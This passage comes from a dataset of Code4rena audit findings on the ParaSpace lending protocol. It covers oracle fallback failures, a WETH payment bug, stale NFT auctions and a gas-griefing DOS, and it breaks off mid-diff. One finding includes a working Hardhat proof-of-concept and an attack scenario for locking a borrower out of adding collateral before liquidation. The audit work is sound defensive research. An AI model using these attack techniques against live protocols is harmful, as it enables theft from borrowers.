/paraspace-core/contracts/misc/ParaSpaceOracle.sol   #4\n\n114      /// @inheritdoc IPriceOracleGetter\n115      function getAssetPrice(address asset)\n116          public\n117          view\n118          override\n119          returns (uint256)\n120      {\n121          if (asset == BASE_CURRENCY) {\n122              return BASE_CURRENCY_UNIT;\n123          }\n124  \n125          uint256 price = 0;\n126          IEACAggregatorProxy source = IEACAggregatorProxy(assetsSources[asset]);\n127          if (address(source) != address(0)) {\n128 @>           price = uint256(source.latestAnswer());\n129          }\n130          if (price == 0 && address(_fallbackOracle) != address(0)) {\n131 @>           price = _fallbackOracle.getAssetPrice(asset);\n132          }\n133  \n134          require(price != 0, Errors.ORACLE_PRICE_NOT_READY);\n135          return price;\n136:     }\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceOracle.sol#L114-L136\n\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nUse a try-catch when fetching the normal `latestAnswer()`, and use the fallback if it failed",
      "summary": "\nThis bug report is about the ParaSpaceOracle.sol contract. It is a smart contract that is used to fetch asset prices from a feeder oracle and a fallback oracle. If the feeders haven't updated their prices within the default six-hour time window, the floor oracle will revert when requests are made to get the current price. These reverts are not caught by the wrapper oracle which handles the fallback oracle, so rather than using the fallback oracle in these cases, the calls will revert, leading to liquidations to fail. Additionally, the code uses the deprecated chainlink `latestAnswer()` API for its token requests, which may revert once it is no longer supported.\n\nThe bug can be reproduced by calling the `getPrice()` function, which will fail if the values are stale. This can be caused by too much price skew, or the feeders being down. The wrapper oracle does not use a try-catch, so it can't swallow these reverts and allow the fallback oracle to be used.\n\nThe recommended mitigation step is to use a try-catch when fetching the normal `latestAnswer()`, and use the fallback if it failed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/420",
      "tags": [
        "Oracle",
        "Chainlink"
      ],
      "finders": [
        "0x52",
        "Trust",
        "0xNazgul",
        "rbserver",
        "Lambda",
        "Franfran",
        "IllIllI",
        "erictee",
        "RaymondFam",
        "hansfriese",
        "imare",
        "__141345__",
        "Rolezn",
        "Jeiwan",
        "gzeon",
        "ujamal_",
        "skinz",
        "codecustard",
        "rvierdiiev",
        "seyni"
      ]
    },
    {
      "id": "15994",
      "title": "[M-11] LooksRare orders using WETH as currency cannot be paid with WETH",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L51-L54><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L564-L565>\n\nUsers won't be able to buy NFTs from LooksRare via the Paraspace Marketplace and pay with WETH when `MakerOrder` currency is set to WETH.\n\n### Proof of Concept\n\nThe Paraspace Marketplace allows users to buy NFTs from third-party marketplaces (LooksRare, Seaport, X2Y2) using funds borrowed from Paraspace. The mechanism of buying tokens requires a `MakerOrder`: a data structure that's created by the seller and posted on a third-party exchange and that contains all the information about the order. Besides other fields, `MakerOrder` contains the `currency` field, which sets the currency the buyer is willing to receive payment in ([OrderTypes.sol#L20](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/dependencies/looksrare/contracts/libraries/OrderTypes.sol#L20)):\n\n```solidity\nstruct MakerOrder {\n    ...\n    address currency; // currency (e.g., WETH)\n    ...\n}\n```\n\nWhile WETH is supported by LooksRare as a currency of orders, the LooksRare adapter of Paraspace converts it to the native (e.g. ETH) currency: if order's currency is WETH, the currency of consideration is set to the native currency ([LooksRareAdapter.sol#L49-L62](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L49-L62)):\n\n```solidity\nItemType itemType = ItemType.ERC20;\naddress token = makerAsk.currency;\nif (token == weth) {\n    itemType = ItemType.NATIVE;\n    token = address(0);\n}\nconsideration[0] = ConsiderationItem(\n    itemType,\n    token,\n    0,\n    makerAsk.price, // TODO: take minPercentageToAsk into account\n    makerAsk.price,\n    payable(takerBid.taker)\n);\n```\n\nWhen users call the `buyWithCredit` function, they provide credit parameters: token address and amount (besides others) ([PoolMarketplace.sol#L71-L76](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/PoolMarketplace.sol#L71-L76), [DataTypes.sol#L296-L303](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/types/DataTypes.sol#L296-L303)):\n\n```solidity\nfunction buyWithCredit(\n    bytes32 marketplaceId,\n    bytes calldata payload,\n    DataTypes.Credit calldata credit,\n    uint16 referralCode\n) external payable virtual override nonReentrant {\n```\n\n```solidity\nstruct Credit {\n    address token;\n    uint256 amount;\n    bytes orderId;\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n}\n```\n\nDeep inside the `buyWithCredit` function, `isETH` flag is set when the credit token specified by user is `address(0)` ([MarketplaceLogic.sol#L564-L566](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L564-L566)):\n\n```solidity\nvars.isETH = params.credit.token == address(0);\nvars.creditToken = vars.isETH ? params.weth : params.credit.token;\nvars.creditAmount = params.credit.amount;\n```\n\nFinally, before giving a credit, consideration type and credit token are checked ([MarketplaceLogic.sol#L388-L392](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L388-L392)):\n\n```solidity\nrequire(\n    item.itemType == ItemType.ERC20 ||\n        (vars.isETH && item.itemType == ItemType.NATIVE),\n    Errors.INVALID_ASSET_TYPE\n);\n```\n\nThis is what happens when a user tries to buy an NFT from LooksRare and pays with WETH as the maker order requires:\n\n1.  User calls `buyWithCredit` and sets credit token to WETH.\n2.  The currency of the consideration is changed to the native currency, and the consideration token is set to `address(0)`.\n3.  `var.isETH` is not set since the credit token is WETH, not `address(0)`.\n4.  The consideration type and credit token check fails because the type of the consideration is `NATIVE` but `var.isETH` is not set.\n5.  As a result, the call to `buyWithCredit` reverts and the user cannot buy a token while correctly using the API.\n\n```js\nit(\"fails when trying to buy a token on LooksRare with WETH [AUDIT]\", async () => {\n  const {\n    doodles,\n    pool,\n    weth,\n    users: [maker, taker, middleman],\n  } = await loadFixture(testEnvFixture);\n  const payNowNumber = \"8\";\n  const creditNumber = \"2\";\n  const payNowAmount = await convertToCurrencyDecimals(\n    weth.address,\n    payNowNumber\n  );\n  const creditAmount = await convertToCurrencyDecimals(\n    weth.address,\n    creditNumber\n  );\n  const startAmount = payNowAmount.add(creditAmount);\n  const nftId = 0;\n  // mint WETH to offer\n  await mintAndValidate(weth, payNowNumber, taker);\n  // middleman supplies DAI to pool to be borrowed by offer later\n  await supplyAndValidate(weth, creditNumber, middleman, true);\n  // maker mint mayc\n  await mintAndValidate(doodles, \"1\", maker);\n  // approve\n  await waitForTx(\n    await weth.connect(taker.signer).approve(pool.address, payNowAmount)\n  );\n\n  await expect(\n    executeLooksrareBuyWithCredit(\n      doodles,\n      weth as MintableERC20,\n      startAmount,\n      creditAmount,\n      nftId,\n      maker,\n      taker\n    )\n  ).to.be.revertedWith('93'); // invalid asset type for action.\n});\n```\n\n### Recommended Mitigation Steps\n\nConsider removing the WETH to NATIVE conversion in the LooksRare adapter. Alternatively, consider converting WETH to ETH seamlessly, without forcing users to send ETH instead of WETH when maker order requires WETH.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns an issue with the Paraspace Marketplace, which allows users to buy NFTs from third-party marketplaces (LooksRare, Seaport, X2Y2) using funds borrowed from Paraspace. When users call the `buyWithCredit` function, they provide credit parameters, such as the token address and amount. However, when the credit token specified by the user is WETH, the currency of consideration is set to the native currency, instead of WETH. This results in the call to `buyWithCredit` reverting and the user being unable to buy a token while correctly using the API.\n\nThe bug was found using manual review. The recommended mitigation steps to fix this issue are to either remove the WETH to NATIVE conversion in the LooksRare adapter, or to convert WETH to ETH seamlessly, without forcing users to send ETH instead of WETH when maker order requires WETH.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/344",
      "tags": [],
      "finders": [
        "Jeiwan"
      ]
    },
    {
      "id": "15993",
      "title": "[M-10] Users can be locked out of providing Uniswap V3 NFTs as collateral",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L248><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L107>\n\nA malicious actor can disallow supplying of Uniswap V3 NFT tokens as collateral for any user. This can be exploited as a front-running attack that disallows a borrower to provide more Uniswap V3 LP tokens as collateral and save their collateral from being liquidated.\n\n### Proof of Concept\n\nThe protocol allows users to provide Uniswap V3 NFT tokens as collateral. Since these tokens can be minted freely, a malicious actor may provide a huge number of such tokens as collateral and impose high gas consumption by the `calculateUserAccountData` function of `GenericLogic` (which calculates user's collateral and debt value). Potentially, this can lead to out of gas errors during collateral/debt values calculation. To protect against this attack, a limit on the number of Uniswap V3 NFTs a user can provide as collateral was added ([NTokenUniswapV3.sol#L33-L35](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol#L33-L35)):\n\n```solidity\nconstructor(IPool pool) NToken(pool, true) {\n    _ERC721Data.balanceLimit = 30;\n}\n```\n\nThe limit is enforced during Uniswap V3 NToken minting and transferring ([MintableERC721Logic.sol#L247-L248](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L247-L248), [MintableERC721Logic.sol#L106-L107](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L106-L107), [MintableERC721Logic.sol#L402-L414](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L402-L414)):\n\n```solidity\nuint64 newBalance = oldBalance + uint64(tokenData.length);\n_checkBalanceLimit(erc721Data, ATOMIC_PRICING, newBalance);\n```\n\n```solidity\nuint64 newRecipientBalance = oldRecipientBalance + 1;\n_checkBalanceLimit(erc721Data, ATOMIC_PRICING, newRecipientBalance);\n```\n\n```solidity\nfunction _checkBalanceLimit(\n    MintableERC721Data storage erc721Data,\n    bool ATOMIC_PRICING,\n    uint64 balance\n) private view {\n    if (ATOMIC_PRICING) {\n        uint64 balanceLimit = erc721Data.balanceLimit;\n        require(\n            balanceLimit == 0 || balance <= balanceLimit,\n            Errors.NTOKEN_BALANCE_EXCEEDED\n        );\n    }\n}\n```\n\nWhile protecting from the attack mentioned above, this creates a new attack vector: a malicious actor can send many Uniswap V3 NTokens to a victim and lock them out of adding more Uniswap V3 NTokens as collateral. This attack is viable and cheap because *Uniswap V3 NFTs can have 0 liquidity*, thus the attacker would only need to pay transaction fees, which are cheap on L2 networks.\n\n#### Exploit Scenario\n\n1.  Bob provides Uniswap V3 NFTs as collateral on Paraspace and borrows other tokens.\n2.  Due to extreme market conditions, Bob's health factor is getting closer to the liquidation threshold.\n3.  Bob, while being an active liquidity provider on Uniswap, supplies another Uniswap V3 NFT as a collateral.\n4.  Alice runs liquidation and front-running bots. One of her bots notices that Bob is trying to increase his collateral value with a Uniswap V3 NFT.\n5.  Alice's bot mints multiple Uniswap V3 NFTs using the same asset tokens by removing all liquidity from tokens after they were minted.\n6.  Alice's bot supplies the newly minted NFTs on behalf of Bob. Bob's balance of Uniswap V3 NFTs reaches the maximal allowed.\n7.  Bob's transaction to add another Uniswap V3 NFT as collateral fails due to the balance limit being reached.\n8.  While Bob is trying to figure out what's happened and before he provides collateral in other tokens or withdraws the empty NTokens, Alice's bot liquidates Bob's debt.\n\n```ts\n// paraspace-core/test/_uniswapv3_position_control.spec.ts\nit(\"allows to fill balanceLimit of another user cheaply [AUDIT]\", async () => {\n  const {\n    users: [user1, user2],\n    dai,\n    weth,\n    nftPositionManager,\n    nUniswapV3,\n    pool\n  } = testEnv;\n\n  // user1 has 1 token initially.\n  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(\"1\");\n\n  // Set the limit to 5 tokens so the test runs faster.\n  let totalTokens = 5;\n  await waitForTx(await nUniswapV3.setBalanceLimit(totalTokens));\n\n  const userDaiAmount = await convertToCurrencyDecimals(dai.address, \"10000\");\n  const userWethAmount = await convertToCurrencyDecimals(weth.address, \"10\");\n  await fund({ token: dai, user: user2, amount: userDaiAmount });\n  await fund({ token: weth, user: user2, amount: userWethAmount });\n  let nft = nftPositionManager.connect(user2.signer);\n  await approveTo({ target: nftPositionManager.address, token: dai, user: user2 });\n  await approveTo({ target: nftPositionManager.address, token: weth, user: user2 });\n  const fee = 3000;\n  const tickSpacing = fee / 50;\n  const lowerPrice = encodeSqrtRatioX96(1, 10000);\n  const upperPrice = encodeSqrtRatioX96(1, 100);\n  await nft.setApprovalForAll(nftPositionManager.address, true);\n  await nft.setApprovalForAll(pool.address, true);\n  const MaxUint128 = DRE.ethers.BigNumber.from(2).pow(128).sub(1);\n\n  let daiAvailable, wethAvailable;\n\n  // user2 is going to mint 4 Uniswap V3 NFTs using the same amount of DAI and WETH.\n  // After each mint, user2 removes all liquidity from a token and uses it to mint\n  // next token.\n  for (let tokenId = 2; tokenId <= totalTokens; tokenId++) {\n    daiAvailable = await dai.balanceOf(user2.address);\n    wethAvailable = await weth.balanceOf(user2.address);\n\n    await mintNewPosition({\n      nft: nft,\n      token0: dai,\n      token1: weth,\n      fee: fee,\n      user: user2,\n      tickSpacing: tickSpacing,\n      lowerPrice,\n      upperPrice,\n      token0Amount: daiAvailable,\n      token1Amount: wethAvailable,\n    });\n\n    const liquidity = (await nftPositionManager.positions(tokenId)).liquidity;\n\n    await nft.decreaseLiquidity({\n      tokenId: tokenId,\n      liquidity: liquidity,\n      amount0Min: 0,\n      amount1Min: 0,\n      deadline: 2659537628,\n    });\n\n    await nft.collect({\n      tokenId: tokenId,\n      recipient: user2.address,\n      amount0Max: MaxUint128,\n      amount1Max: MaxUint128,\n    });\n\n    expect((await nftPositionManager.positions(tokenId)).liquidity).to.eq(\"0\");\n  }\n\n  // user2 supplies the 4 UniV3 NFTs to user1.\n  const tokenData = Array.from({ length: totalTokens - 1 }, (_, i) => {\n    return {\n      tokenId: i + 2,\n      useAsCollateral: true\n    }\n  });\n  await waitForTx(\n    await pool\n      .connect(user2.signer)\n      .supplyERC721(\n        nftPositionManager.address,\n        tokenData,\n        user1.address,\n        0,\n        {\n          gasLimit: 12_450_000,\n        }\n      )\n  );\n\n  expect(await nUniswapV3.balanceOf(user2.address)).to.eq(0);\n  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(totalTokens);\n\n  // user1 tries to supply another UniV3 NFT but fails, since the limit has\n  // already been reached.\n  await fund({ token: dai, user: user1, amount: userDaiAmount });\n  await fund({ token: weth, user: user1, amount: userWethAmount });\n  nft = nftPositionManager.connect(user1.signer);\n  await mintNewPosition({\n    nft: nft,\n    token0: dai,\n    token1: weth,\n    fee: fee,\n    user: user1,\n    tickSpacing: tickSpacing,\n    lowerPrice,\n    upperPrice,\n    token0Amount: userDaiAmount,\n    token1Amount: userWethAmount,\n  });\n\n  await expect(\n    pool\n      .connect(user1.signer)\n      .supplyERC721(\n        nftPositionManager.address,\n        [{ tokenId: totalTokens + 1, useAsCollateral: true }],\n        user1.address,\n        0,\n        {\n          gasLimit: 12_450_000,\n        }\n      )\n  ).to.be.revertedWith(\"120\");  //ntoken balance exceed limit.\n\n  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(totalTokens);\n\n  // The cost of the attack was low. user2's balance of DAI and WETH\n  // hasn't changed, only the rounding error of Uniswap V3 was subtracted.\n  expect(await dai.balanceOf(user2.address)).to.eq(\"9999999999999999999996\");\n  expect(await weth.balanceOf(user2.address)).to.eq(\"9999999999999999996\");\n});\n```\n\n### Recommended Mitigation Steps\n\nConsider disallowing supplying Uniswap V3 NFTs that have 0 liquidity and removing the entire liquidity from tokens that have already been supplied. Setting a minimal required liquidity for a Uniswap V3 NFT will make this attack more costly, however it won't remove the attack vector entirely.\n\n**[LSDan (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-paraspace-findings/issues/334#issuecomment-1375749711)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a malicious actor exploiting a vulnerability in the Paraspace protocol that allows them to disallow supplying of Uniswap V3 NFT tokens as collateral for any user. This vulnerability can be exploited as a front-running attack that disallows a borrower to provide more Uniswap V3 LP tokens as collateral and save their collateral from being liquidated. \n\nThe protocol allows users to provide Uniswap V3 NFT tokens as collateral and to protect against an attack, a limit on the number of Uniswap V3 NFTs a user can provide as collateral was added. This limit is enforced during Uniswap V3 NToken minting and transferring.\n\nHowever, this creates a new attack vector: a malicious actor can send many Uniswap V3 NTokens to a victim and lock them out of adding more Uniswap V3 NTokens as collateral. This attack is viable and cheap because Uniswap V3 NFTs can have 0 liquidity, thus the attacker would only need to pay transaction fees, which are cheap on L2 networks.\n\nThe exploit scenario is as follows: Bob provides Uniswap V3 NFTs as collateral on Paraspace and borrows other tokens. Due to extreme market conditions, Bob's health factor is getting closer to the liquidation threshold. Bob, while being an active liquidity provider on Uniswap, supplies another Uniswap V3 NFT as a collateral. Alice runs liquidation and front-running bots and notices that Bob is trying to increase his collateral value with a Uniswap V3 NFT. Alice's bot mints multiple Uniswap V3 NFTs using the same asset tokens by removing all liquidity from tokens after they were minted. Alice's bot supplies the newly minted NFTs on behalf of Bob. Bob's balance of Uniswap V3 NFTs reaches the maximal allowed and his transaction to add another Uniswap V3 NFT as collateral fails due to the balance limit being reached. While Bob is trying to figure out what's happened and before he provides collateral in other tokens or withdraws the empty NTokens, Alice's bot liquidates Bob's debt.\n\nThe recommended mitigation steps are to consider disallowing supplying Uniswap V3 NFTs that have 0 liquidity and removing the entire liquidity",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/334",
      "tags": [],
      "finders": [
        "Jeiwan",
        "Trust"
      ]
    },
    {
      "id": "15992",
      "title": "[M-09] User collateral NFT open auctions would be sold as min price immediately next time user health factor gets below the liquidation threshold, protocol should check health factor and set auctionValidityTime value anytime a valid action happens to user account to invalidate old open auctions",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/DefaultReserveAuctionStrategy.sol#L90-L135><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L424-L434>\n\nAttacker can liquidate users NFT collaterals with min price immediately after user health factor gets below the liquidation threshold for NFT collaterals that have old open auctions and `setAuctionValidityTime()` is not get called for the user. Whenever user's account health factor gets below the NFT liquidation threshold attacker can start auction for all of users NFTs in the protocol. User needs to call `setAuctionValidityTime()` to invalidated all of those open auctions whenever his/her account health factor is good, but if user doesn't call this and doesn't close those auctions then next time user's accounts health factor gets below the threshold, attacker would liquidate all of those NFTs with minimum price immediately.\n\n### Proof of Concept\n\nThis is `calculateAuctionPriceMultiplier()` code in DefaultReserveAuctionStrategy:\n\n        function calculateAuctionPriceMultiplier(\n            uint256 auctionStartTimestamp,\n            uint256 currentTimestamp\n        ) external view override returns (uint256) {\n            uint256 ticks = PRBMathUD60x18.div(\n                currentTimestamp - auctionStartTimestamp,\n                _tickLength\n            );\n            return _calculateAuctionPriceMultiplierByTicks(ticks);\n        }\n\n        function _calculateAuctionPriceMultiplierByTicks(uint256 ticks)\n            internal\n            view\n            returns (uint256)\n        {\n            if (ticks < PRBMath.SCALE) {\n                return _maxPriceMultiplier;\n            }\n\n            uint256 ticksMinExp = PRBMathUD60x18.div(\n                (PRBMathUD60x18.ln(_maxPriceMultiplier) -\n                    PRBMathUD60x18.ln(_minExpPriceMultiplier)),\n                _stepExp\n            );\n            if (ticks <= ticksMinExp) {\n                return\n                    PRBMathUD60x18.div(\n                        _maxPriceMultiplier,\n                        PRBMathUD60x18.exp(_stepExp.mul(ticks))\n                    );\n            }\n\n            uint256 priceMinExpEffective = PRBMathUD60x18.div(\n                _maxPriceMultiplier,\n                PRBMathUD60x18.exp(_stepExp.mul(ticksMinExp))\n            );\n            uint256 ticksMin = ticksMinExp +\n                (priceMinExpEffective - _minPriceMultiplier).div(_stepLinear);\n\n            if (ticks <= ticksMin) {\n                return priceMinExpEffective - _stepLinear.mul(ticks - ticksMinExp);\n            }\n\n            return _minPriceMultiplier;\n        }\n\nAs you can see when long times passed from auction start time the price of auction would be minimum.<br>\nThis is `isAuctioned()` code in MintableERC721Data contract:\n\n```\n\n    function isAuctioned(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId\n    ) public view returns (bool) {\n        return\n            erc721Data.auctions[tokenId].startTime >\n            POOL\n                .getUserConfiguration(erc721Data.owners[tokenId])\n                .auctionValidityTime;\n    }\n```\n\nAs you can see auction is valid if startTime is bigger than user's `auctionValidityTime`. but the value of `auctionValidityTime` should be set manually by calling `PoolParameters.setAuctionValidityTime()`, so by default auction would stay open. imagine this scenario:\n\n1.  user NFT health factor gets under the liquidation threshold.\n2.  attacker calls `startAuction()` for all user collateral NFT tokens.\n3.  user supply some collateral and his health factor become good.\n4.  some time passes and user NFT health factor gets under the liquidation threshold.\n5.  attacker can liquidate all of user NFT collateral with minimum price of auction immediately.\n6.  user would lose his NFTs without proper auction.\n\nThis scenario can be common because liquidation and health factor changes happens on-chain and most of the user isn't always watches his account health factor and he wouldn't know when his account health factor gets below the liquidation threshold and when it's needed for him to call `setAuctionValidityTime()`. so over time this would happen to more users.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nContract should check and set the value of `auctionValidityTime` for user whenever an action happens to user account.<br>\nAlso there should be some incentive mechanism for anyone starting or ending an auction.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that exists in the code of the Paraspace protocol. The vulnerability allows an attacker to liquidate a user's NFT collateral with a minimum price immediately after the user's health factor drops below the liquidation threshold for NFT collaterals, even if the user has old open auctions and has not called the `setAuctionValidityTime()` function.\n\nThe proof of concept for the vulnerability is provided in two pieces of code from the DefaultReserveAuctionStrategy and MintableERC721Data contracts. The code from the DefaultReserveAuctionStrategy shows how the price of an auction decreases the longer it is open, and the code from the MintableERC721Data contract shows how the auction is valid as long as the startTime is greater than the user's `auctionValidityTime` value.\n\nThe vulnerability is demonstrated in a scenario where a user's health factor drops below the liquidation threshold, and an attacker calls the `startAuction()` function for all of the user's collateral NFT tokens. The user then supplies some collateral to bring their health factor back up, but if they do not call the `setAuctionValidityTime()` function, the attacker can liquidate all of the user's NFTs with the minimum price of the auction.\n\nThe recommended mitigation steps for this vulnerability include adding a check and set for the `auctionValidityTime` value whenever an action is performed on a user's account, as well as implementing an incentive mechanism for anyone starting or ending an auction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/323",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "15991",
      "title": "[M-08] Adversary can force user to pay large gas fees by transfering them collateral",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/SupplyLogic.sol#L462-L512>\n\nAdversary can DOS user and make them pay more gas by sending them collateral.\n\n### Proof of Concept\n\n    if (fromConfig.isUsingAsCollateral(reserveId)) {\n        if (fromConfig.isBorrowingAny()) {\n            ValidationLogic.validateHFAndLtvERC20(\n                reservesData,\n                reservesList,\n                usersConfig[params.from],\n                params.asset,\n                params.from,\n                params.reservesCount,\n                params.oracle\n            );\n        }\n\n        if (params.balanceFromBefore == params.amount) {\n            fromConfig.setUsingAsCollateral(reserveId, false);\n            emit ReserveUsedAsCollateralDisabled(\n                params.asset,\n                params.from\n            );\n        }\n\n        //@audit collateral is automatically turned on for receiver\n        if (params.balanceToBefore == 0) {\n            DataTypes.UserConfigurationMap\n                storage toConfig = usersConfig[params.to];\n\n            toConfig.setUsingAsCollateral(reserveId, true);\n            emit ReserveUsedAsCollateralEnabled(\n                params.asset,\n                params.to\n            );\n        }\n    }\n\nThe above lines are executed when a user transfer collateral to another user. If the sending user currently has the collateral enabled and the receiving user doesn't have a balance already, the collateral will automatically be enabled for the receiver. Since the collateral is enabled, it will now be factored into the health check calculation. This increases gas for the receiver every time the user does anything that requires a health check (which ironically includes turning off a collateral). If enough different kinds of collateral are added to the platform it may even be enough gas to DOS the users.\n\n### Recommended Mitigation Steps\n\nDon't automatically enable the collateral for the receiver.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the code of a platform where users can transfer collateral to each other. The issue is that when the sending user has the collateral enabled and the receiving user does not have a balance already, the code automatically enables the collateral for the receiver. This increases the gas costs for the receiver every time they do anything that requires a health check, which includes turning off the collateral. If enough different kinds of collateral are added to the platform, it could even be enough gas to cause a denial of service (DOS) attack on the users. The recommended mitigation step for this issue is to not automatically enable the collateral for the receiver. This can be done by making changes to the code so that it does not enable the collateral for the receiver when the conditions in the bug report are met.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/321",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "15990",
      "title": "[M-07] NTokenMoonBirds Reserve Pool Cannot Receive Airdrops",
      "impact": "MEDIUM",
      "content": "\nThe NTokenMoonBirds Reserve Pool only allows Moonbird NFT to be sent to the pool contract as shown in Line 70 below.\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenMoonBirds.sol#L63>\n\n```solidity\nFile: NTokenMoonBirds.sol\n63:     function onERC721Received(\n64:         address operator,\n65:         address from,\n66:         uint256 id,\n67:         bytes memory\n68:     ) external virtual override returns (bytes4) {\n69:         // only accept MoonBird tokens\n70:         require(msg.sender == _underlyingAsset, Errors.OPERATION_NOT_SUPPORTED);\n71: \n72:         // if the operator is the pool, this means that the pool is transferring the token to this contract\n73:         // which can happen during a normal supplyERC721 pool tx\n74:         if (operator == address(POOL)) {\n75:             return this.onERC721Received.selector;\n76:         }\n77: \n78:         // supply the received token to the pool and set it as collateral\n79:         DataTypes.ERC721SupplyParams[]\n80:             memory tokenData = new DataTypes.ERC721SupplyParams[](1);\n81: \n82:         tokenData[0] = DataTypes.ERC721SupplyParams({\n83:             tokenId: id,\n84:             useAsCollateral: true\n85:         });\n86: \n87:         POOL.supplyERC721FromNToken(_underlyingAsset, tokenData, from);\n88: \n89:         return this.onERC721Received.selector;\n90:     }\n```\n\nNote that the NTokenMoonBirds Reserve Pool is the holder/owner of all Moonbird NFTs within ParaSpace. If there is any airdrop for Moonbird NFT, the airdrop will be sent to the NTokenMoonBirds Reserve Pool.\n\nHowever, due to the validation in Line 70, the NTokenMoonBirds Reserve Pool will not be able to receive any airdrop (e.g. Moonbirds Oddities NFT) other than the Moonbird NFT. In summary, if any NFT other than Moonbird NFT is sent to the pool, it will revert.\n\nFor instance, Moonbirds Oddities NFT has been airdropped to Moonbird NFT nested stakers in the past. With the nesting staking feature, more airdrops are expected in the future. In this case, any users who collateralized their nested Moonbird NFT within ParaSpace will lose their opportunities to claim the airdrop.\n\n### Impact\n\nLoss of assets for the user. Users will not be able to receive any airdropped assets for their nested Moonbird NFT.\n\n### Recommended Mitigation Steps\n\nUpdate the contract to allow airdrops to be received by the NTokenMoonBirds Reserve Pool.\n\n```diff\nfunction onERC721Received(\n\taddress operator,\n\taddress from,\n\tuint256 id,\n\tbytes memory\n) external virtual override returns (bytes4) {\n-\t// only accept MoonBird tokens\n-\trequire(msg.sender == _underlyingAsset, Errors.OPERATION_NOT_SUPPORTED);\n\n\t// if the operator is the pool, this means that the pool is transferring the token to this contract\n\t// which can happen during a normal supplyERC721 pool tx\n\tif (operator == address(POOL)) {\n\t\treturn this.onERC721Received.selector;\n\t}\n\n+\tif msg.sender == 